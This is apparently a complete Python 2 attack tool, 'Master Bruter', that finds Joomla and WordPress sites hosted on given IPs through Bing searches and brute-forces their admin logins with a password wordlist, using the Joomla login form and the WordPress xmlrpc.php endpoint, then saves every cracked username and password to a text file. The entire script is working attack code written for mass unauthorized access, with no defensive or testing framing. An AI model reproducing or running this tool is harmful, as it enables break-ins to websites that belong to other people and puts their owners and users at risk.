#!/usr/bin/env python2
# Author : MatriX Coder
# matrix.coder1[at]gmail.com
# NOTE : maybe the code is not well comented but i did my best
# I disabled the multithreaded code for now, because of some bugs
import requests
import re
#import Queue
#import threading
#from multiprocessing import Process
import argparse
from sys import argv

class Colors(object):
  PURPLE = '\033[95m'
  CYAN = '\033[96m'
  DARKCYAN = '\033[36m'
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  RED = '\033[91m'
  BOLD = '\033[1m'
  ENDC = '\033[0m'

class Jmbrute(object) :
  """
  Class to brute force joomla
  """
  def __init__(self, website, timeout=10) :
    self.website = website
    # Making a requests sesion object
    self.req = requests.session()
    self.timeout = timeout

  def __makeGet(self, url) :
    try :
      return self.req.get(url, timeout=self.timeout).text
    except :
      pass

  def getToken(self) :
    try :
      return re.search('<input type="hidden" name="(.*?)" value="1" />', self.__makeGet(self.website)).group(1)
    except :
      return False

  def trylogin(self, user, passwd, token) :
    dat = {
        'username' : user,
        'passwd'   : passwd,
        token      : '1',
        'lang'     : '',
        'option'   : 'com_login',
        'task'     : 'login',
        'return'   : 'aW5kZXgucGhw'
        }
    try :
      self.req.post(self.website, data=dat, timeout=self.timeout)
    except :
      pass
  def checklog(self) :
    res = self.__makeGet(self.website)
    if res : return 'logout' in res
    else : return False

class WPxmlrpc(object):
  """
  A class to brute force Wordpress using
  XMLrpc in new versions
  """
  # Yes this seems dumb a class with two function and one of them is an init
  def __init__(self, website, timeout=10) :
    self.website = website
    self.timeout = timeout

  def sendPost(self, user, passwd) :
    # The fast and ugly way
    try :
      xmlobj = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>""" % (user, passwd)
      req = requests.post(self.website, data=xmlobj, timeout=self.timeout)
      return req.text
    except :
      return False

  def checklog(self, resptext) :
    for li in resptext.split() :
      # assuming that the content is not html
      if re.findall("faultString", li) :
        return False
        break
      elif not re.findall('html', resptext) and re.findall('isAdmin', li) : return True

# Just logs in case of success
def logger(website, user, passwd, filename) :
  with open(filename, 'a') as myfile :
    myfile.write('Cracked '+website+' username : '+user+' | password : '+passwd+'\n')

# My traditional grabbers using bing search
def getJoomla(ip) :
  lista = []
  page = 1
  while page <= 101:
    try:
      resp = requests.get('http://www.bing.com/search?q=ip%3A'+ip+'+index.php?option=com&count=50&first='+str(page)).text
      findwebs = re.findall('<h2><a href="(.*?)"', resp)
      for jmnoclean in findwebs:
        findjm = re.findall('(.*?)index.php', jmnoclean)
        lista.extend(findjm)
      page += 50
    except:
      pass
    return set(list(lista))

def getWordpress(ip) :
  lista = []
  page = 1
  while page <= 101:
    try:
      resp = requests.get('http://www.bing.com/search?q=ip%3A'+ip+'+?page_id=&count=50&first='+str(page)).text
      findwebs = re.findall('<h2><a href="(.*?)"', resp)
      for wpnoclean in findwebs:
        findwp = re.findall('(.*?)\?page_id=', wpnoclean)
        lista.extend(findwp)
      page += 50
    except:
      pass
    return set(list(lista))

def file2list(fil) :
  with open(fil, 'r')  as myfile :
    return myfile.read().split()

# I could also use list comprehension it's more elegant
def addcontrol(weblist, panel) :
  ret = []
  for li in weblist :
    ret.append(li+panel)
  return ret

# The "smart" part LOL :p
def jmorwp(website) :
  try :
    req1 = requests.get(website+'administrator/index.php', timeout=2)
    req2 = requests.get(website+'xmlrpc.php', timeout=2)
    if req1.status_code == 200 :
      return 'jm'
    elif req2.status_code == 200 :
      return 'wp'
    else : return False
  except :
    return False

parser = argparse.ArgumentParser()
parser.add_argument('-s', help='Set site', dest='site')
parser.add_argument('-v', '--verbose', help='Increase output verbosity', action='store_true')
parser.add_argument('-fs', help='Set sites file', dest='fs')
parser.add_argument('-fi', help='Set ip file', dest='fi')
parser.add_argument('-i', help='Set ip', dest='ip')
parser.add_argument('-w', help='Set wordlist', dest='wordl')
#parser.add_argument('-t', '--threads', help='Set threads', dest='threads')
parser.add_argument('-jm', '--joomla', help='Brute force joomla websites', action='store_true')
parser.add_argument('-wp', '--wordpress', help='Brute force wordpress websites', action='store_true')
parser.add_argument('-x', '--allwebsites', help='Brute force all', action='store_true')
parser.add_argument('-sm', '--smart', help='Detect joomla and wordpress scripts', action='store_true')
parser.add_argument('-hl', '--hidelogo', help='Hide logo', action='store_true')
parser.add_argument('-wu', '--wordpress-user', help='Set wordpress user', dest='wu')
parser.add_argument('-ju', '--joomla-user', help='Set joomla user', dest='ju')
args = parser.parse_args()
jmlist = []
wplist = []
#sitelist = []
if not args.hidelogo :
  print Colors.BLUE+"""
   /$$      /$$                       /$$                               /$$$$$$$                        /$$
  | $$$    /$$$                      | $$                              | $$__  $$                      | $$
  | $$$$  /$$$$  /$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$       | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$
  | $$ $$/$$ $$ |____  $$ /$$_____/|_  $$_/   /$$__  $$ /$$__  $$      | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   /$$__  $$
  | $$  $$$| $$  /$$$$$$$|  $$$$$$   | $$    | $$$$$$$$| $$  \__/      | $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$
  | $$\  $ | $$ /$$__  $$ \____  $$  | $$ /$$| $$_____/| $$            | $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/
  | $$ \/  | $$|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$            | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$
  |__/     |__/ \_______/|_______/    \___/   \_______/|__/            |_______/ |__/       \______/    \___/   \_______/ v1.2

  """+Colors.ENDC
  # Just for that the text will be in center
  print Colors.CYAN+'Author : MatriX Coder'.rjust(81)+Colors.ENDC
  print
if argv==1 or not args.wordl :
  print parser.print_help()
else :
  #if args.threads : threads_count = int(args.threads)
  #else : threads_count = 1
  if args.site :
    if args.joomla : jmlist = [args.site]
    elif args.wordpress : wplist = [args.site]
  elif args.fs :
    if args.smart :
      for website in file2list(args.fs) :
        if jmorwp(website) == 'jm' :
          if args.verbose : print '[*] "smart" mode detected that', website, 'is joomla'
          jmlist.append(website)
        elif jmorwp(website) == 'wp' :
          if args.verbose : print '[*] "smart" mode detected that', website, 'is wordpress'
          wplist.append(website)
    elif args.joomla : jmlist = file2list(args.fs)
    elif args.wordpress : wplist = file2list(args.fs)
  elif args.ip :
    #sitelist = getJoomla(args.ip) if args.joomla else args.wordpress
    # Just for testing
    if args.joomla :
      if args.verbose :
        print 'Grabbing joomla websites from bing search'
      jmlist = getJoomla(args.ip)
    elif args.wordpress :
      if args.verbose :
        print 'Grabbing wordpress websites from bing search'
      wplist = getWordpress(args.ip)
    elif args.allwebsites :
      if args.verbose : print 'Grabbing both joomla and wordpress from bing search'
      jmlist = getJoomla(args.ip)
      wplist = getWordpress(args.ip)
  elif args.fi :
    for ip in file2list(args.fi) :
      if args.joomla :
        if args.verbose : print '[*] Grabbing Joomla from', ip
        jmlist.extend(getJoomla(ip))
      elif args.wordpress :
        if args.verbose : print '[*] Grabbing wordpress from', ip
        wplist.extend(getWordpress(ip))
      elif args.allwebsites :
        if args.verbose : print '[*] Grabbing Joomla from', ip
        jmlist.extend(getJoomla(ip))
        if args.verbose : print '[*] Grabbing wordpress from', ip
        wplist.extend(getWordpress(ip))
  wusr = 'admin' if not args.wu else args.wu
  jusr = 'admin' if not args.ju else args.ju
  #~ if not args.timeout : thetimeout  = 10
  #~ elif args.timeout : thetimeout = args.timeout
  #~ print thetimeout
  passlist = file2list(args.wordl)
  wplist = addcontrol(wplist, 'xmlrpc.php')
  jmlist = addcontrol(jmlist, 'administrator/index.php')
  #print wplist
  #print jmlist
  #sitelist = [x+'administrator/index.php' for x in sitelist]
  if jmlist :
    print '[+] Brute forcing', len(jmlist), 'joomla sites'
    for site in jmlist :
      for passwd in passlist :
        jm = Jmbrute(site)
        token = jm.getToken()
        if token :
          jm.trylogin(jusr, passwd, token)
          if args.verbose : print '[*] Trying '+site+':'+jusr+':'+passwd
          if jm.checklog() :
            print Colors.GREEN+'[*] Cracked', site, 'user : '+jusr, 'pass :', passwd+Colors.ENDC
            logger(site, jusr, passwd, 'joomla.txt')
            break

  if wplist :
    print '[+] Brute forcing', len(wplist), 'wordpress sites'
    for site in wplist :
      for passwd in passlist :
        wp = WPxmlrpc(site)
        resp = wp.sendPost(wusr, passwd)
        #print resp
        if args.verbose : print '[*] Trying '+site+':'+wusr+':'+passwd
        if resp :
          if wp.checklog(resp) :
            print Colors.GREEN+'[*] Cracked', site, 'user : '+wusr, 'pass :', passwd+Colors.ENDC
            logger(site, wusr, passwd, 'wordpress.txt')
            break

#EOF
